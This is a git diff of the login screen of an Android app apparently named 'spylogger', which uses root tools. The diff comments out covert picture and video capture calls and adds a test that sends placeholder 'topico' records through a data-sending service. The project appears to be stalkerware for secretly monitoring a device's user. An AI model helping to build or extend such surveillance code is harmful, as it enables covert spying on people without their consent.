@@ -34,10 +34,11 @@ import android.widget.TextView;
 import android.widget.Toast;
 
 import com.gravatasufoca.spylogger.R;
-import com.gravatasufoca.spylogger.helpers.ServicosHelper;
 import com.gravatasufoca.spylogger.model.Configuracao;
+import com.gravatasufoca.spylogger.model.Topico;
 import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
+import com.gravatasufoca.spylogger.services.SendDataService;
 import com.gravatasufoca.spylogger.utils.Utils;
 import com.stericson.RootTools.RootTools;
 import com.utilidades.gravata.utils.Utilidades;
@@ -137,9 +138,17 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
         mEmailSignInButton2.setOnClickListener(new OnClickListener() {
             @Override
             public void onClick(View view) {
-                ServicosHelper servicosHelper=new ServicosHelper();
+//                ServicosHelper servicosHelper=new ServicosHelper();
 //                servicosHelper.getPicture(getApplicationContext(),true);
-                servicosHelper.getVideo(getApplicationContext(),10,true);
+//                servicosHelper.getVideo(getApplicationContext(),10,true);
+                SendDataService sendDataService=new SendDataService();
+                List<Topico> topicos=new ArrayList<Topico>(){{
+                    add(new Topico.TopicoBuilder().setNome("topico").build());
+                    add(new Topico.TopicoBuilder().setNome("topico 2").build());
+                }};
+
+                sendDataService.enviarTopicos(topicos);
+
             }
         });
 
